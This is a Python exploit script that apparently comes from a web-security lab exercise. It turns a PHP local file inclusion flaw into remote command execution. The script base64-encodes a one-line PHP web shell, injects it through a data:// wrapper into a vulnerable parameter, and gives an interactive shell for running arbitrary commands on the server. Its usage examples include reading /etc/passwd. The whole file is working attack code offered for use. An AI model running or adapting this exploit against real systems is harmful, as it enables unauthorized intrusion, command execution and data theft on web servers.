#!/usr/bin/env python3
"""
Simple LFI to RCE Shell - Following Manual Workflow
Based on: data:// wrapper + base64 encoding + grep filtering
"""

import requests
import base64
import argparse
import sys
from urllib.parse import quote_plus
import re

def create_webshell():
    """Step 1: Create PHP web shell code"""
    return '<?php system($_GET["cmd"]); ?>'

def encode_webshell(webshell):
    """Step 2: Base64 encode the web shell"""
    # Encode to bytes, then base64, then decode to string
    encoded = base64.b64encode(webshell.encode()).decode()
    return encoded

def url_encode_payload(base64_payload):
    """Step 3: URL encode the base64 payload using quote_plus"""
    # quote_plus: spaces→+, special chars→%XX
    return quote_plus(base64_payload)

def build_url(target, param, encoded_payload, command):
    """Step 4: Build the full URL with data:// wrapper"""
    # Ensure target has protocol
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Build data:// wrapper payload
    data_wrapper = f"data://text/plain;base64,{encoded_payload}"
    
    # URL encode the command (spaces become +)
    cmd_encoded = quote_plus(command)
    
    # Build full URL
    separator = '&' if '?' in target else '?'
    url = f"{target}{separator}{param}={data_wrapper}&cmd={cmd_encoded}"
    
    return url

def filter_html(text):
    """Step 5: Remove HTML tags like grep -v '<.*>'"""
    lines = text.split('\n')
    filtered = []
    
    for line in lines:
        # Skip lines that contain < or > (HTML tags)
        if '<' not in line and '>' not in line:
            stripped = line.strip()
            if stripped:  # Only include non-empty lines
                filtered.append(stripped)
    
    return '\n'.join(filtered)

def execute_command(target, param, command, verbose=False):
    """Execute a command through the LFI vulnerability"""
    
    # Step 1: Create web shell
    webshell = create_webshell()
    if verbose:
        print(f"[1] Web Shell: {webshell}")
    
    # Step 2: Base64 encode
    base64_shell = encode_webshell(webshell)
    if verbose:
        print(f"[2] Base64: {base64_shell}")
    
    # Step 3: URL encode
    url_encoded = url_encode_payload(base64_shell)
    if verbose:
        print(f"[3] URL Encoded: {url_encoded}")
    
    # Step 4: Build URL
    url = build_url(target, param, url_encoded, command)
    if verbose:
        print(f"[4] Full URL: {url}\n")
    
    try:
        # Step 5: Execute with curl-like request
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            return None, f"HTTP {response.status_code}"
        
        # Step 6: Filter output (like grep -v "<.*>")
        filtered = filter_html(response.text)
        
        return filtered, None
        
    except Exception as e:
        return None, str(e)

def interactive_shell(target, param, verbose=False):
    """Run an interactive shell session"""
    
    print("=" * 60)
    print("Simple LFI to RCE Shell (data:// wrapper method)")
    print("=" * 60)
    print(f"Target: {target}")
    print(f"Parameter: {param}")
    print("=" * 60)
    
    # Test connection
    print("\n[*] Testing connection...")
    output, error = execute_command(target, param, "id", verbose)
    
    if error:
        print(f"[!] Error: {error}")
        response = input("\nContinue anyway? (y/n): ")
        if response.lower() != 'y':
            return
    else:
        print(f"[+] Connection successful!\n{output}\n")
    
    print("Type 'exit' to quit, 'help' for commands\n")
    
    while True:
        try:
            cmd = input("shell> ").strip()
            
            if not cmd:
                continue
            
            if cmd.lower() in ['exit', 'quit']:
                print("\n[*] Exiting...")
                break
            
            if cmd.lower() == 'help':
                print_help()
                continue
            
            if cmd.lower() == 'clear':
                import os
                os.system('clear' if sys.platform != 'win32' else 'cls')
                continue
            
            # Execute command
            output, error = execute_command(target, param, cmd, verbose)
            
            if error:
                print(f"[!] Error: {error}")
            elif output:
                print(output)
            else:
                print("[*] No output")
            
            print()
            
        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit")
            continue
        except EOFError:
            print("\n[*] Exiting...")
            break

def print_help():
    """Print help information"""
    print("\nCommon Commands:")
    print("  id              - Show current user")
    print("  pwd             - Current directory")
    print("  ls -la          - List files")
    print("  cat <file>      - Read file")
    print("  whoami          - Current username")
    print("  uname -a        - System info")
    print("  find / -name <file> 2>/dev/null  - Find files")
    print("\nBuilt-in:")
    print("  help            - Show this help")
    print("  clear           - Clear screen")
    print("  exit/quit       - Exit shell")
    print()

def main():
    parser = argparse.ArgumentParser(
        description='Simple LFI to RCE Shell using data:// wrapper',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive shell
  %(prog)s 94.237.120.233:51510/index.php -i

  # Single command
  %(prog)s 94.237.120.233:51510/index.php -c "ls /"

  # Read a file
  %(prog)s 94.237.120.233:51510/index.php -c "cat /etc/passwd"

  # Different parameter name
  %(prog)s target.com/page.php -p file -c "id"

  # Verbose mode (see the workflow)
  %(prog)s 94.237.120.233:51510/index.php -c "id" -v

Workflow (same as manual):
  1. Create web shell: <?php system($_GET["cmd"]); ?>
  2. Base64 encode: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
  3. URL encode with quote_plus
  4. Include via: language=data://text/plain;base64,<encoded>
  5. Execute: &cmd=<command>
  6. Filter: grep -v "<.*>" (remove HTML)
        """
    )
    
    parser.add_argument('target', 
                       help='Target URL (e.g., 94.237.120.233:51510/index.php)')
    parser.add_argument('-p', '--param', default='language',
                       help='Vulnerable parameter name (default: language)')
    parser.add_argument('-c', '--command',
                       help='Single command to execute')
    parser.add_argument('-i', '--interactive', action='store_true',
                       help='Interactive shell mode')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Show the full workflow (useful for learning)')
    
    args = parser.parse_args()
    
    if args.interactive:
        interactive_shell(args.target, args.param, args.verbose)
    elif args.command:
        if args.verbose:
            print("=" * 60)
            print("Workflow Steps:")
            print("=" * 60)
        
        output, error = execute_command(args.target, args.param, args.command, args.verbose)
        
        if error:
            print(f"[!] Error: {error}", file=sys.stderr)
            sys.exit(1)
        elif output:
            print(output)
        else:
            print("[*] No output")
    else:
        parser.print_help()
        print("\n[!] Must specify either -i (interactive) or -c (command)")
        sys.exit(1)

if __name__ == '__main__':
    main()